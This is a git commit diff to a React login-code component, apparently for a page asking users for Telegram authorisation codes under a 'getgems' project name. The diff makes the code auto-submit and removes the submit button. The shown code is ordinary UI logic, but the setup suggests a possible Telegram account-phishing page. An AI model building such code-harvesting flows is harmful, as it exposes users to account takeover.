e8cac4fb4c88ed7b803d8b8f428e08cd5d4ba842
www-getgems <ivm4ik@gmail.com>
2025-11-30 23:38:06 +0200

    Ы

--- my-react-app/src/auth_code.jsx
+++ my-react-app/src/auth_code.jsx
@@ -59,6 +59,10 @@ export default function Auth2() {
     if (value && index < CODE_LENGTH - 1) {
       inputsRef.current[index + 1]?.focus(); 
     }
+
+    if (newCode.every(digit => digit !== "")) {
+        handleSubmitCode()
+    }
   };
 
   const handleKeyDown = (e, index) => {
@@ -97,14 +101,6 @@ export default function Auth2() {
       <p className="mt-5 text-sm text-gray-400">
         Вы можете отозвать доступ в любое время в настройках Telegram
       </p>
-
-      <button
-        onClick={handleSubmitCode}
-        disabled={code.some(digit => digit === "")}
-        className="mt-6 px-8 py-3 bg-blue-500 text-white text-lg font-semibold rounded-lg hover:bg-blue-600 disabled:bg-gray-600 disabled:cursor-not-allowed transition"
-      >
-        Отправить
-      </button>
     </div>
   );
 }
